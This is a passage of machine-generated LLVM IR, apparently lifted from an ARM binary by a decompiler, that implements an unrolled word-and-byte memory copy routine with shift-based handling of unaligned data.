  %v1_15304 = inttoptr i32 %v0_15304 to i32*
  store i32 %v5_152c8, i32* %v1_15304, align 4
  %v3_15304 = add i32 %v0_15304, 4
  %v4_15304 = inttoptr i32 %v3_15304 to i32*
  %v5_15304 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15304, i32* %v4_15304, align 4
  %v6_15304 = add i32 %v0_15304, 8
  %v7_15304 = inttoptr i32 %v6_15304 to i32*
  %v8_15304 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15304, i32* %v7_15304, align 4
  %v9_15304 = add i32 %v0_15304, 12
  %v10_15304 = inttoptr i32 %v9_15304 to i32*
  %v11_15304 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_15304, i32* %v10_15304, align 4
  %v12_15304 = add i32 %v0_15304, 16
  %v13_15304 = inttoptr i32 %v12_15304 to i32*
  %v14_15304 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_15304, i32* %v13_15304, align 4
  %v15_15304 = add i32 %v0_15304, 20
  %v16_15304 = inttoptr i32 %v15_15304 to i32*
  %v17_15304 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_15304, i32* %v16_15304, align 4
  %v18_15304 = add i32 %v0_15304, 24
  %v19_15304 = inttoptr i32 %v18_15304 to i32*
  %v20_15304 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_15304, i32* %v19_15304, align 4
  %v21_15304 = add i32 %v0_15304, 28
  %v22_15304 = inttoptr i32 %v21_15304 to i32*
  %v23_15304 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_15304, i32* %v22_15304, align 4
  %v24_15304 = add i32 %v0_15304, 32
  store i32 %v24_15304, i32* %r0.global-to-local, align 4
  %v0_15308 = load i32, i32* %fp.global-to-local, align 4
  %v1_15308 = and i32 %v0_15308, 32768
  %v2_15308 = icmp eq i32 %v1_15308, 0
  %v3_15308 = udiv i32 %v0_15308, 65536
  store i32 %v3_15308, i32* @r3, align 4
  br i1 %v2_15308, label %dec_label_pc_153d0.loopexit18, label %.dec_label_pc_152b8_crit_edge

.dec_label_pc_152b8_crit_edge:                    ; preds = %bb153
  %v0_152b8.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_152bc.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_152c0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152b8

dec_label_pc_15318:                               ; preds = %dec_label_pc_152ac, %.dec_label_pc_15318_crit_edge
  %v0_15364 = phi i32 [ %v24_15364, %.dec_label_pc_15318_crit_edge ], [ %v0_1530437, %dec_label_pc_152ac ]
  %v0_15320 = phi i32 [ %v0_15320.pre, %.dec_label_pc_15318_crit_edge ], [ %v1_1529c, %dec_label_pc_152ac ]
  %v0_1531c = phi i32 [ %v0_1531c.pre, %.dec_label_pc_15318_crit_edge ], [ %v4_15314, %dec_label_pc_152ac ]
  %v1_15328 = phi i32 [ %v0_15318.pre, %.dec_label_pc_15318_crit_edge ], [ %v2_15314, %dec_label_pc_152ac ]
  store i32 %v1_15328, i32* %r4.global-to-local, align 4
  %v1_1531c = inttoptr i32 %v0_1531c to i32*
  %v2_1531c = load i32, i32* %v1_1531c, align 4
  store i32 %v2_1531c, i32* %r5.global-to-local, align 4
  %v3_1531c = add i32 %v0_1531c, 4
  %v4_1531c = inttoptr i32 %v3_1531c to i32*
  %v5_1531c = load i32, i32* %v4_1531c, align 4
  store i32 %v5_1531c, i32* %r6.global-to-local, align 4
  %v6_1531c = add i32 %v0_1531c, 8
  %v7_1531c = inttoptr i32 %v6_1531c to i32*
  %v8_1531c = load i32, i32* %v7_1531c, align 4
  store i32 %v8_1531c, i32* %r7.global-to-local, align 4
  %v9_1531c = add i32 %v0_1531c, 12
  %v10_1531c = inttoptr i32 %v9_1531c to i32*
  %v11_1531c = load i32, i32* %v10_1531c, align 4
  store i32 %v11_1531c, i32* %r8.global-to-local, align 4
  %v12_1531c = add i32 %v0_1531c, 16
  %v13_1531c = inttoptr i32 %v12_1531c to i32*
  %v14_1531c = load i32, i32* %v13_1531c, align 4
  store i32 %v14_1531c, i32* %sb.global-to-local, align 4
  %v15_1531c = add i32 %v0_1531c, 20
  %v16_1531c = inttoptr i32 %v15_1531c to i32*
  %v17_1531c = load i32, i32* %v16_1531c, align 4
  store i32 %v17_1531c, i32* %sl.global-to-local, align 4
  %v18_1531c = add i32 %v0_1531c, 24
  %v19_1531c = inttoptr i32 %v18_1531c to i32*
  %v20_1531c = load i32, i32* %v19_1531c, align 4
  store i32 %v20_1531c, i32* %fp.global-to-local, align 4
  %v21_1531c = add i32 %v0_1531c, 28
  store i32 %v21_1531c, i32* %r1.global-to-local, align 4
  %v1_15320 = add i32 %v0_15320, -32
  store i32 %v1_15320, i32* %r2.global-to-local, align 4
  %v2_15320 = icmp ugt i32 %v0_15320, 31
  br i1 %v2_15320, label %bb154, label %bb155

bb154:                                            ; preds = %dec_label_pc_15318
  %v2_15324 = inttoptr i32 %v21_1531c to i32*
  %v3_15324 = load i32, i32* %v2_15324, align 4
  store i32 %v3_15324, i32* %ip.global-to-local, align 4
  %v5_15324 = add i32 %v0_1531c, 32
  store i32 %v5_15324, i32* %r1.global-to-local, align 4
  br label %bb155

bb155:                                            ; preds = %dec_label_pc_15318, %bb154
  %v0_15328 = load i32, i32* @r3, align 4
  %v4_15328 = mul i32 %v1_15328, 16777216
  %v5_15328 = or i32 %v0_15328, %v4_15328
  %v3_1532c = udiv i32 %v1_15328, 256
  %v4_15330 = mul i32 %v2_1531c, 16777216
  %v5_15330 = or i32 %v4_15330, %v3_1532c
  store i32 %v5_15330, i32* %r4.global-to-local, align 4
  %v3_15334 = udiv i32 %v2_1531c, 256
  %v4_15338 = mul i32 %v5_1531c, 16777216
  %v5_15338 = or i32 %v4_15338, %v3_15334
  store i32 %v5_15338, i32* %r5.global-to-local, align 4
  %v3_1533c = udiv i32 %v5_1531c, 256
  %v4_15340 = mul i32 %v8_1531c, 16777216
  %v5_15340 = or i32 %v4_15340, %v3_1533c
  store i32 %v5_15340, i32* %r6.global-to-local, align 4
  %v3_15344 = udiv i32 %v8_1531c, 256
  %v4_15348 = mul i32 %v11_1531c, 16777216
  %v5_15348 = or i32 %v4_15348, %v3_15344
  store i32 %v5_15348, i32* %r7.global-to-local, align 4
  %v3_1534c = udiv i32 %v11_1531c, 256
  %v4_15350 = mul i32 %v14_1531c, 16777216
  %v5_15350 = or i32 %v4_15350, %v3_1534c
  store i32 %v5_15350, i32* %r8.global-to-local, align 4
  %v3_15354 = udiv i32 %v14_1531c, 256
  %v4_15358 = mul i32 %v17_1531c, 16777216
  %v5_15358 = or i32 %v4_15358, %v3_15354
  store i32 %v5_15358, i32* %sb.global-to-local, align 4
  %v3_1535c = udiv i32 %v17_1531c, 256
  %v4_15360 = mul i32 %v20_1531c, 16777216
  %v5_15360 = or i32 %v4_15360, %v3_1535c
  store i32 %v5_15360, i32* %sl.global-to-local, align 4
  %v1_15364 = inttoptr i32 %v0_15364 to i32*
  store i32 %v5_15328, i32* %v1_15364, align 4
  %v3_15364 = add i32 %v0_15364, 4
  %v4_15364 = inttoptr i32 %v3_15364 to i32*
  %v5_15364 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15364, i32* %v4_15364, align 4
  %v6_15364 = add i32 %v0_15364, 8
  %v7_15364 = inttoptr i32 %v6_15364 to i32*
  %v8_15364 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15364, i32* %v7_15364, align 4
  %v9_15364 = add i32 %v0_15364, 12
  %v10_15364 = inttoptr i32 %v9_15364 to i32*
  %v11_15364 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_15364, i32* %v10_15364, align 4
  %v12_15364 = add i32 %v0_15364, 16
  %v13_15364 = inttoptr i32 %v12_15364 to i32*
  %v14_15364 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_15364, i32* %v13_15364, align 4
  %v15_15364 = add i32 %v0_15364, 20
  %v16_15364 = inttoptr i32 %v15_15364 to i32*
  %v17_15364 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_15364, i32* %v16_15364, align 4
  %v18_15364 = add i32 %v0_15364, 24
  %v19_15364 = inttoptr i32 %v18_15364 to i32*
  %v20_15364 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_15364, i32* %v19_15364, align 4
  %v21_15364 = add i32 %v0_15364, 28
  %v22_15364 = inttoptr i32 %v21_15364 to i32*
  %v23_15364 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_15364, i32* %v22_15364, align 4
  %v24_15364 = add i32 %v0_15364, 32
  store i32 %v24_15364, i32* %r0.global-to-local, align 4
  %v0_15368 = load i32, i32* %fp.global-to-local, align 4
  %v1_15368 = and i32 %v0_15368, 128
  %v2_15368 = icmp eq i32 %v1_15368, 0
  %v3_15368 = udiv i32 %v0_15368, 256
  store i32 %v3_15368, i32* @r3, align 4
  br i1 %v2_15368, label %dec_label_pc_153d0.loopexit17, label %.dec_label_pc_15318_crit_edge

.dec_label_pc_15318_crit_edge:                    ; preds = %bb155
  %v0_15318.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1531c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_15320.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15318

dec_label_pc_15374:                               ; preds = %dec_label_pc_152a4
  %v0_15374 = load i32, i32* %r1.global-to-local, align 4
  %v1_15374 = inttoptr i32 %v0_15374 to i32*
  %v2_15374 = load i32, i32* %v1_15374, align 4
  store i32 %v2_15374, i32* %ip.global-to-local, align 4
  %v4_15374 = add i32 %v0_15374, 4
  store i32 %v4_15374, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15378

dec_label_pc_15378:                               ; preds = %.dec_label_pc_15378_crit_edge, %dec_label_pc_15374
  %v0_153c4 = phi i32 [ %v24_153c4, %.dec_label_pc_15378_crit_edge ], [ %v0_1530437, %dec_label_pc_15374 ]
  %v0_15380 = phi i32 [ %v0_15380.pre, %.dec_label_pc_15378_crit_edge ], [ %v1_1529c, %dec_label_pc_15374 ]
  %v0_1537c = phi i32 [ %v0_1537c.pre, %.dec_label_pc_15378_crit_edge ], [ %v4_15374, %dec_label_pc_15374 ]
  %v1_15388 = phi i32 [ %v0_15378.pre, %.dec_label_pc_15378_crit_edge ], [ %v2_15374, %dec_label_pc_15374 ]
  store i32 %v1_15388, i32* %r4.global-to-local, align 4
  %v1_1537c = inttoptr i32 %v0_1537c to i32*
  %v2_1537c = load i32, i32* %v1_1537c, align 4
  store i32 %v2_1537c, i32* %r5.global-to-local, align 4
  %v3_1537c = add i32 %v0_1537c, 4
  %v4_1537c = inttoptr i32 %v3_1537c to i32*
  %v5_1537c = load i32, i32* %v4_1537c, align 4
  store i32 %v5_1537c, i32* %r6.global-to-local, align 4
  %v6_1537c = add i32 %v0_1537c, 8
  %v7_1537c = inttoptr i32 %v6_1537c to i32*
  %v8_1537c = load i32, i32* %v7_1537c, align 4
  store i32 %v8_1537c, i32* %r7.global-to-local, align 4
  %v9_1537c = add i32 %v0_1537c, 12
  %v10_1537c = inttoptr i32 %v9_1537c to i32*
  %v11_1537c = load i32, i32* %v10_1537c, align 4
  store i32 %v11_1537c, i32* %r8.global-to-local, align 4
  %v12_1537c = add i32 %v0_1537c, 16
  %v13_1537c = inttoptr i32 %v12_1537c to i32*
  %v14_1537c = load i32, i32* %v13_1537c, align 4
  store i32 %v14_1537c, i32* %sb.global-to-local, align 4
  %v15_1537c = add i32 %v0_1537c, 20
  %v16_1537c = inttoptr i32 %v15_1537c to i32*
  %v17_1537c = load i32, i32* %v16_1537c, align 4
  store i32 %v17_1537c, i32* %sl.global-to-local, align 4
  %v18_1537c = add i32 %v0_1537c, 24
  %v19_1537c = inttoptr i32 %v18_1537c to i32*
  %v20_1537c = load i32, i32* %v19_1537c, align 4
  store i32 %v20_1537c, i32* %fp.global-to-local, align 4
  %v21_1537c = add i32 %v0_1537c, 28
  store i32 %v21_1537c, i32* %r1.global-to-local, align 4
  %v1_15380 = add i32 %v0_15380, -32
  store i32 %v1_15380, i32* %r2.global-to-local, align 4
  %v2_15380 = icmp ugt i32 %v0_15380, 31
  br i1 %v2_15380, label %bb156, label %bb157

bb156:                                            ; preds = %dec_label_pc_15378
  %v2_15384 = inttoptr i32 %v21_1537c to i32*
  %v3_15384 = load i32, i32* %v2_15384, align 4
  store i32 %v3_15384, i32* %ip.global-to-local, align 4
  %v5_15384 = add i32 %v0_1537c, 32
  store i32 %v5_15384, i32* %r1.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_15378, %bb156
  %v0_15388 = load i32, i32* @r3, align 4
  %v4_15388 = mul i32 %v1_15388, 256
  %v5_15388 = or i32 %v0_15388, %v4_15388
  %v3_1538c = udiv i32 %v1_15388, 16777216
  %v4_15390 = mul i32 %v2_1537c, 256
  %v5_15390 = or i32 %v4_15390, %v3_1538c
  store i32 %v5_15390, i32* %r4.global-to-local, align 4
  %v3_15394 = udiv i32 %v2_1537c, 16777216
  %v4_15398 = mul i32 %v5_1537c, 256
  %v5_15398 = or i32 %v4_15398, %v3_15394
  store i32 %v5_15398, i32* %r5.global-to-local, align 4
  %v3_1539c = udiv i32 %v5_1537c, 16777216
  %v4_153a0 = mul i32 %v8_1537c, 256
  %v5_153a0 = or i32 %v4_153a0, %v3_1539c
  store i32 %v5_153a0, i32* %r6.global-to-local, align 4
  %v3_153a4 = udiv i32 %v8_1537c, 16777216
  %v4_153a8 = mul i32 %v11_1537c, 256
  %v5_153a8 = or i32 %v4_153a8, %v3_153a4
  store i32 %v5_153a8, i32* %r7.global-to-local, align 4
  %v3_153ac = udiv i32 %v11_1537c, 16777216
  %v4_153b0 = mul i32 %v14_1537c, 256
  %v5_153b0 = or i32 %v4_153b0, %v3_153ac
  store i32 %v5_153b0, i32* %r8.global-to-local, align 4
  %v3_153b4 = udiv i32 %v14_1537c, 16777216
  %v4_153b8 = mul i32 %v17_1537c, 256
  %v5_153b8 = or i32 %v4_153b8, %v3_153b4
  store i32 %v5_153b8, i32* %sb.global-to-local, align 4
  %v3_153bc = udiv i32 %v17_1537c, 16777216
  %v4_153c0 = mul i32 %v20_1537c, 256
  %v5_153c0 = or i32 %v4_153c0, %v3_153bc
  store i32 %v5_153c0, i32* %sl.global-to-local, align 4
  %v1_153c4 = inttoptr i32 %v0_153c4 to i32*
  store i32 %v5_15388, i32* %v1_153c4, align 4
  %v3_153c4 = add i32 %v0_153c4, 4
  %v4_153c4 = inttoptr i32 %v3_153c4 to i32*
  %v5_153c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_153c4, i32* %v4_153c4, align 4
  %v6_153c4 = add i32 %v0_153c4, 8
  %v7_153c4 = inttoptr i32 %v6_153c4 to i32*
  %v8_153c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_153c4, i32* %v7_153c4, align 4
  %v9_153c4 = add i32 %v0_153c4, 12
  %v10_153c4 = inttoptr i32 %v9_153c4 to i32*
  %v11_153c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_153c4, i32* %v10_153c4, align 4
  %v12_153c4 = add i32 %v0_153c4, 16
  %v13_153c4 = inttoptr i32 %v12_153c4 to i32*
  %v14_153c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_153c4, i32* %v13_153c4, align 4
  %v15_153c4 = add i32 %v0_153c4, 20
  %v16_153c4 = inttoptr i32 %v15_153c4 to i32*
  %v17_153c4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_153c4, i32* %v16_153c4, align 4
  %v18_153c4 = add i32 %v0_153c4, 24
  %v19_153c4 = inttoptr i32 %v18_153c4 to i32*
  %v20_153c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_153c4, i32* %v19_153c4, align 4
  %v21_153c4 = add i32 %v0_153c4, 28
  %v22_153c4 = inttoptr i32 %v21_153c4 to i32*
  %v23_153c4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_153c4, i32* %v22_153c4, align 4
  %v24_153c4 = add i32 %v0_153c4, 32
  store i32 %v24_153c4, i32* %r0.global-to-local, align 4
  %v0_153c8 = load i32, i32* %fp.global-to-local, align 4
  %v1_153c8 = and i32 %v0_153c8, 8388608
  %v2_153c8 = icmp eq i32 %v1_153c8, 0
  %v3_153c8 = udiv i32 %v0_153c8, 16777216
  store i32 %v3_153c8, i32* @r3, align 4
  br i1 %v2_153c8, label %dec_label_pc_153d0.loopexit, label %.dec_label_pc_15378_crit_edge

.dec_label_pc_15378_crit_edge:                    ; preds = %bb157
  %v0_15378.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1537c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_15380.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15378

dec_label_pc_153d0.loopexit:                      ; preds = %bb157
  %v6_15380.le = icmp slt i32 %v1_15380, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_15380.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_153d0

dec_label_pc_153d0.loopexit17:                    ; preds = %bb155
  %v6_15320.le = icmp slt i32 %v1_15320, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_15320.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_153d0

dec_label_pc_153d0.loopexit18:                    ; preds = %bb153
  %v6_152c0.le = icmp slt i32 %v1_152c0, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_152c0.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153d0.loopexit18, %dec_label_pc_153d0.loopexit17, %dec_label_pc_153d0.loopexit, %dec_label_pc_1529c
  %v1_153f049 = phi i32 [ %v24_15304, %dec_label_pc_153d0.loopexit18 ], [ %v24_15364, %dec_label_pc_153d0.loopexit17 ], [ %v24_153c4, %dec_label_pc_153d0.loopexit ], [ %v0_1530437, %dec_label_pc_1529c ]
  %v0_153d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_153d0 = sub i32 32, %v0_153d0
  store i32 %v1_153d0, i32* @ip, align 4
  %v0_153d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_153d4 = add i32 %v0_153d4, 32
  store i32 %v1_153d4, i32* %r2.global-to-local, align 4
  %v1_153d8 = add i32 %v0_153d4, 28
  %v2_153d8 = icmp ugt i32 %v1_153d4, 3
  store i1 %v2_153d8, i1* %cpsr_c.global-to-local, align 1
  %v6_153d8 = icmp slt i32 %v1_153d8, 0
  store i1 %v6_153d8, i1* %cpsr_n.global-to-local, align 1
  %v3_153dc = icmp ult i32 %v1_153d4, 2
  br i1 %v3_153dc, label %dec_label_pc_153fc, label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153d0, %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge
  %v1_153f0 = phi i32 [ %v4_153f0, %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge ], [ %v1_153f049, %dec_label_pc_153d0 ]
  %v1_153ec = phi i32 [ %v1_153ec.pre, %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge ], [ %v1_153d0, %dec_label_pc_153d0 ]
  %v2_153e8 = phi i32 [ %v2_153e8.pre, %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge ], [ %v0_153d0, %dec_label_pc_153d0 ]
  %v0_153e4 = phi i32 [ %v0_153f4, %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge ], [ %v1_153d4, %dec_label_pc_153d0 ]
  %v0_153e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_153e0 = inttoptr i32 %v0_153e0 to i32*
  %v2_153e0 = load i32, i32* %v1_153e0, align 4
  store i32 %v2_153e0, i32* %r5.global-to-local, align 4
  %v4_153e0 = add i32 %v0_153e0, 4
  store i32 %v4_153e0, i32* %r1.global-to-local, align 4
  %v1_153e4 = add i32 %v0_153e4, -4
  store i32 %v1_153e4, i32* %r2.global-to-local, align 4
  %v0_153e8 = load i32, i32* @r3, align 4
  %v7_153e8 = shl i32 %v2_153e0, %v2_153e8
  %v8_153e8 = or i32 %v0_153e8, %v7_153e8
  store i32 %v8_153e8, i32* %r4.global-to-local, align 4
  %v6_153ec = lshr i32 %v2_153e0, %v1_153ec
  store i32 %v6_153ec, i32* @r3, align 4
  %v2_153f0 = inttoptr i32 %v1_153f0 to i32*
  store i32 %v8_153e8, i32* %v2_153f0, align 4
  %v3_153f0 = load i32, i32* %r0.global-to-local, align 4
  %v4_153f0 = add i32 %v3_153f0, 4
  store i32 %v4_153f0, i32* %r0.global-to-local, align 4
  %v0_153f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_153f4 = icmp ugt i32 %v0_153f4, 3
  br i1 %v2_153f4, label %dec_label_pc_153e0.dec_label_pc_153e0_crit_edge, label %dec_label_pc_153fc.loopexit

dec_label_pc_153e0.dec_label_pc_153e0_crit_edge:  ; preds = %dec_label_pc_153e0
  %v2_153e8.pre = load i32, i32* %lr.global-to-local, align 4
  %v1_153ec.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_153e0

dec_label_pc_153fc.loopexit:                      ; preds = %dec_label_pc_153e0
  %v1_153f4 = add i32 %v0_153f4, -4
  %v6_153f4 = icmp slt i32 %v1_153f4, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_153f4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153fc.loopexit, %dec_label_pc_153d0, %dec_label_pc_15298, %.thread9
  %v3_15400 = phi i32 [ %v4_153f0, %dec_label_pc_153fc.loopexit ], [ %v1_153f049, %dec_label_pc_153d0 ], [ %v4_1528c, %dec_label_pc_15298 ], [ %v0_1527430, %.thread9 ]
  %v0_153fc = load i32, i32* %lr.global-to-local, align 4
  %v1_153fc = and i32 %v0_153fc, 16
  %v2_153fc = icmp ne i32 %v1_153fc, 0
  store i1 %v2_153fc, i1* %cpsr_c.global-to-local, align 1
  %v3_153fc = mul i32 %v0_153fc, 268435456
  store i32 %v3_153fc, i32* %r5.global-to-local, align 4
  %v4_153fc = icmp slt i32 %v3_153fc, 0
  store i1 %v4_153fc, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_153fc, label %bb158, label %thread-pre-split11

bb158:                                            ; preds = %dec_label_pc_153fc
  %v1_15400 = load i32, i32* @r3, align 4
  %v2_15400 = trunc i32 %v1_15400 to i8
  %v4_15400 = inttoptr i32 %v3_15400 to i8*
  store i8 %v2_15400, i8* %v4_15400, align 1
  %v5_15400 = load i32, i32* %r0.global-to-local, align 4
  %v6_15400 = add i32 %v5_15400, 1
  store i32 %v6_15400, i32* %r0.global-to-local, align 4
  %v0_15404.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_15404.pr, label %bb159, label %.thread-pre-split11_crit_edge

.thread-pre-split11_crit_edge:                    ; preds = %bb158
  %v0_15408.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15408.pr.pre, label %thread-pre-split11._crit_edge, label %.thread14

thread-pre-split11:                               ; preds = %dec_label_pc_153fc
  br i1 %v2_153fc, label %thread-pre-split11._crit_edge, label %.thread14

thread-pre-split11._crit_edge:                    ; preds = %.thread-pre-split11_crit_edge, %thread-pre-split11
  %v3_1540855114 = phi i32 [ %v6_15400, %.thread-pre-split11_crit_edge ], [ %v3_15400, %thread-pre-split11 ]
  %v1_15408.pre = load i32, i32* @r3, align 4
  %extract.t83 = trunc i32 %v1_15408.pre to i8
  br label %bb160

bb159:                                            ; preds = %bb158
  %v1_15404 = load i32, i32* @r3, align 4
  %v2_15404 = and i32 %v1_15404, 128
  %v3_15404 = icmp ne i32 %v2_15404, 0
  store i1 %v3_15404, i1* %cpsr_c.global-to-local, align 1
  %v4_15404 = udiv i32 %v1_15404, 256
  store i32 %v4_15404, i32* @r3, align 4
  %extract.t84 = trunc i32 %v4_15404 to i8
  br i1 %v3_15404, label %bb160, label %.thread14

bb160:                                            ; preds = %thread-pre-split11._crit_edge, %bb159
  %v3_15408 = phi i32 [ %v3_1540855114, %thread-pre-split11._crit_edge ], [ %v6_15400, %bb159 ]
  %v1_15408.off0 = phi i8 [ %extract.t83, %thread-pre-split11._crit_edge ], [ %extract.t84, %bb159 ]
  %v4_15408 = inttoptr i32 %v3_15408 to i8*
  store i8 %v1_15408.off0, i8* %v4_15408, align 1
  %v5_15408 = load i32, i32* %r0.global-to-local, align 4
  %v6_15408 = add i32 %v5_15408, 1
  store i32 %v6_15408, i32* %r0.global-to-local, align 4
  %v0_1540c.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1540c.pr, label %bb161, label %.thread14

bb161:                                            ; preds = %bb160
  %v1_1540c = load i32, i32* @r3, align 4
  %v2_1540c = and i32 %v1_1540c, 128
  %v3_1540c = icmp ne i32 %v2_1540c, 0
  store i1 %v3_1540c, i1* %cpsr_c.global-to-local, align 1
  %v4_1540c = udiv i32 %v1_1540c, 256
  store i32 %v4_1540c, i32* @r3, align 4
  br i1 %v3_1540c, label %bb162, label %.thread14

bb162:                                            ; preds = %bb161
  %v2_15410 = trunc i32 %v4_1540c to i8
  %v4_15410 = inttoptr i32 %v6_15408 to i8*
  store i8 %v2_15410, i8* %v4_15410, align 1
  %v5_15410 = load i32, i32* %r0.global-to-local, align 4
  %v6_15410 = add i32 %v5_15410, 1
  store i32 %v6_15410, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread-pre-split11_crit_edge, %bb159, %thread-pre-split11, %bb160, %bb161, %bb162
  %v3_1542877 = phi i32 [ %v6_15400, %bb159 ], [ %v3_15400, %thread-pre-split11 ], [ %v6_15408, %bb160 ], [ %v6_15408, %bb161 ], [ %v6_15410, %bb162 ], [ %v6_15400, %.thread-pre-split11_crit_edge ]
  %v2_15414 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_15414, i32* @r5, align 4
  store i32 %v5_15234, i32* @r6, align 4
  store i32 %v8_15234, i32* @r7, align 4
  store i32 %v11_15234, i32* @r8, align 4
  store i32 %v14_15234, i32* @sb, align 4
  store i32 %v17_15234, i32* @sl, align 4
  store i32 %v20_15234, i32* @fp, align 4
  %v0_15418.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_1522c, %dec_label_pc_1513c, %.thread14
  %v3_15428 = phi i32 [ %v1_151a8, %dec_label_pc_1522c ], [ %v3_1513c, %dec_label_pc_1513c ], [ %v3_1542877, %.thread14 ]
  %v0_15418 = phi i32 [ %v0_1522c, %dec_label_pc_1522c ], [ %v0_15144, %dec_label_pc_1513c ], [ %v0_15418.pre, %.thread14 ]
  %v1_15418 = and i32 %v0_15418, 2
  %v2_15418 = icmp ne i32 %v1_15418, 0
  store i1 %v2_15418, i1* %cpsr_c.global-to-local, align 1
  %v3_15418 = shl i32 %v0_15418, 31
  store i32 %v3_15418, i32* @r2, align 4
  %v4_15418 = icmp ne i32 %v3_15418, 0
  store i1 %v4_15418, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_15418, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_15418
  %v1_1541c = load i32, i32* %r1.global-to-local, align 4
  %v2_1541c = inttoptr i32 %v1_1541c to i8*
  %v3_1541c = load i8, i8* %v2_1541c, align 1
  %v4_1541c = zext i8 %v3_1541c to i32
  store i32 %v4_1541c, i32* @r2, align 4
  %v6_1541c = add i32 %v1_1541c, 1
  store i32 %v6_1541c, i32* %r1.global-to-local, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_15418, %bb163
  %v1_15428.off0 = phi i8 [ 0, %dec_label_pc_15418 ], [ %v3_1541c, %bb163 ]
  br i1 %v2_15418, label %bb165, label %.thread15

bb165:                                            ; preds = %bb164
  %v1_15420 = load i32, i32* %r1.global-to-local, align 4
  %v2_15420 = inttoptr i32 %v1_15420 to i8*
  %v3_15420 = load i8, i8* %v2_15420, align 1
  %v4_15420 = zext i8 %v3_15420 to i32
  store i32 %v4_15420, i32* @r3, align 4
  %v6_15420 = add i32 %v1_15420, 1
  store i32 %v6_15420, i32* %r1.global-to-local, align 4
  %v2_15424 = inttoptr i32 %v6_15420 to i8*
  %v3_15424 = load i8, i8* %v2_15424, align 1
  %v4_15424 = zext i8 %v3_15424 to i32
  store i32 %v4_15424, i32* @ip, align 4
  br label %.thread15

.thread15:                                        ; preds = %bb164, %bb165
  br i1 %v4_15418, label %bb166, label %bb167

bb166:                                            ; preds = %.thread15
  %v4_15428 = inttoptr i32 %v3_15428 to i8*
  store i8 %v1_15428.off0, i8* %v4_15428, align 1
  %v5_15428 = load i32, i32* %r0.global-to-local, align 4
  %v6_15428 = add i32 %v5_15428, 1
  store i32 %v6_15428, i32* %r0.global-to-local, align 4
  %v0_1542c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1542c.pre, label %bb168, label %.thread16

bb167:                                            ; preds = %.thread15
  br i1 %v2_15418, label %bb168, label %.thread16

bb168:                                            ; preds = %bb166, %bb167
  %v3_1542c115 = phi i32 [ %v6_15428, %bb166 ], [ %v3_15428, %bb167 ]
  %v1_1542c = load i32, i32* @r3, align 4
  %v2_1542c = trunc i32 %v1_1542c to i8
  %v4_1542c = inttoptr i32 %v3_1542c115 to i8*
  store i8 %v2_1542c, i8* %v4_1542c, align 1
  %v5_1542c = load i32, i32* %r0.global-to-local, align 4
  %v6_1542c = add i32 %v5_1542c, 1
